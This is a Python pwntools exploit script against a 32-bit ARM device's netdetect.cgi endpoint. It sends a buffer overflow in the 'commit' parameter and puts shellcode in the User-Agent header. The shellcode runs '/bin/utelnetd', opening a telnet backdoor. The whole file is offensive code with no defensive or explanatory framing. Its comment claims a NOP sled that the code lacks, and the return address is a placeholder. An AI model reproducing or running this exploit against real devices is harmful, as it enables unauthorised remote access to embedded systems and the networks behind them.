from pwn import *
from pwn import p32
from define import *
import requests

context.arch = 'arm'
context.bits = 32
context.endian = 'little'

TARGET_IP = '127.0.0.1:8080'
logging.basicConfig(level=logging.DEBUG)

# NOP sled + shellcode + shellcode address
shellcode = bytes([
  0x01, 0x30, 0x8f, 0xe2, 0x13, 0xff, 0x2f, 0xe1, 0x02, 0xa0, 0x49, 0x40,
  0x52, 0x40, 0x42, 0x73, 0x0b, 0x27, 0x01, 0xdf, 0x2f, 0x73, 0x62, 0x69,
  0x6e, 0x2f, 0x75, 0x74, 0x65, 0x6c, 0x6e, 0x65, 0x74, 0x64, 0x58, 0x58
])

payload = b'A' * 88 + p32(0xdeadbeef) # Skipping the first 7 bytes(commit=...)

req = requests.get(
        f'http://{TARGET_IP}/nd-bin/netdetect.cgi', 
        params = { 'commit': payload },
        headers = { 'User-Agent': shellcode,}
    )
